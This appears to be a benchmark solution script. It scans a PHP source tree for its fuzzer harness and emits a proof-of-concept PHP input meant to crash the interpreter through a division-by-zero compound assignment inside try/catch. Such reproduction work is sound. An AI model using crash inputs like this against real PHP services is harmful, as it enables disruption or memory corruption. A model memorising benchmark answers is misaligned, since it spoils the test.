import os
import re
import tarfile
from pathlib import Path
from typing import Iterable, Optional, Tuple


class Solution:
    def _read_file_limited(self, fp, limit: int) -> bytes:
        return fp.read(limit)

    def _iter_source_texts_from_tar(self, tar: tarfile.TarFile) -> Iterable[Tuple[str, str]]:
        # Prefer likely harness and fuzzer-related files
        preferred = []
        other = []
        for m in tar:
            if not m.isfile():
                continue
            name = m.name
            lname = name.lower()
            if m.size <= 0 or m.size > 600_000:
                continue
            if not (lname.endswith((".c", ".cc", ".cpp", ".h", ".hh", ".hpp")) or "fuzz" in lname):
                continue
            if ("fuzz" in lname) or ("sapi/fuzzer" in lname) or ("llvmfuzzer" in lname) or ("fuzzer" in lname):
                preferred.append(m)
            else:
                other.append(m)

        # Read preferred first, then a bounded number of others
        seen = 0
        for m in preferred:
            try:
                f = tar.extractfile(m)
                if f is None:
                    continue
                data = f.read(600_000)
            except Exception:
                continue
            try:
                text = data.decode("utf-8", errors="ignore")
            except Exception:
                text = data.decode("latin-1", errors="ignore")
            yield m.name, text
            seen += 1
            if seen >= 200:
                return

        for m in other:
            if seen >= 350:
                return
            try:
                f = tar.extractfile(m)
                if f is None:
                    continue
                data = f.read(600_000)
            except Exception:
                continue
            try:
                text = data.decode("utf-8", errors="ignore")
            except Exception:
                text = data.decode("latin-1", errors="ignore")
            yield m.name, text
            seen += 1

    def _iter_source_texts_from_dir(self, root: Path) -> Iterable[Tuple[str, str]]:
        exts = {".c", ".cc", ".cpp", ".h", ".hh", ".hpp"}
        preferred = []
        other = []
        for dp, _, fns in os.walk(root):
            for fn in fns:
                p = Path(dp) / fn
                try:
                    st = p.stat()
                except Exception:
                    continue
                if st.st_size <= 0 or st.st_size > 600_000:
                    continue
                lname = str(p).lower()
                if p.suffix.lower() not in exts and "fuzz" not in lname:
                    continue
                if ("fuzz" in lname) or ("sapi/fuzzer" in lname) or ("llvmfuzzer" in lname) or ("fuzzer" in lname):
                    preferred.append(p)
                else:
                    other.append(p)

        seen = 0
        for p in preferred + other:
            if seen >= 350:
                return
            try:
                data = p.read_bytes()
            except Exception:
                continue
            try:
                text = data.decode("utf-8", errors="ignore")
            except Exception:
                text = data.decode("latin-1", errors="ignore")
            yield str(p), text
            seen += 1

    def _analyze_php_mode(self, src_path: str) -> Tuple[bool, bool]:
        """
        Returns (is_php_project, eval_mode)
        eval_mode=True means the harness likely uses zend_eval_string* / eval compilation and input should NOT contain <?php tag.
        """
        is_php = False
        eval_mode = False

        def process_text(name: str, text: str) -> None:
            nonlocal is_php, eval_mode
            if not is_php:
                if ("zend_" in text and "php.h" in text) or ("#include \"php.h\"" in text) or ("zend_execute" in text) or ("ZEND_VM" in text):
                    is_php = True
            if not eval_mode:
                if ("zend_eval_stringl" in text) or ("zend_eval_string" in text) or ("ZEND_COMPILE_DEFAULT_FOR_EVAL" in text):
                    eval_mode = True

        p = Path(src_path)
        if p.is_dir():
            for name, text in self._iter_source_texts_from_dir(p):
                process_text(name, text)
                if eval_mode and is_php:
                    break
            if not is_php:
                # quick additional marker check
                for marker in ("Zend", "sapi", "main/php.h", "Zend/zend.h"):
                    if (p / marker).exists():
                        is_php = True
                        break
            return is_php, eval_mode

        if tarfile.is_tarfile(src_path):
            try:
                with tarfile.open(src_path, "r:*") as tar:
                    # quick name-based detection
                    try:
                        for m in tar.getmembers():
                            n = m.name
                            if "Zend/" in n or "/Zend/" in n or n.endswith("main/php.h") or "/main/php.h" in n or "sapi/" in n:
                                is_php = True
                                break
                    except Exception:
                        pass

                with tarfile.open(src_path, "r:*") as tar:
                    for name, text in self._iter_source_texts_from_tar(tar):
                        process_text(name, text)
                        if eval_mode and is_php:
                            break
            except Exception:
                pass
            return is_php, eval_mode

        return False, False

    def solve(self, src_path: str) -> bytes:
        is_php, eval_mode = self._analyze_php_mode(src_path)

        payload_core = r"$a=chr(48);try{$b=$a/=0;}catch(Throwable$e){}echo$a;"
        if is_php and not eval_mode:
            payload = r"<?php" + payload_core
        else:
            payload = payload_core

        return payload.encode("utf-8")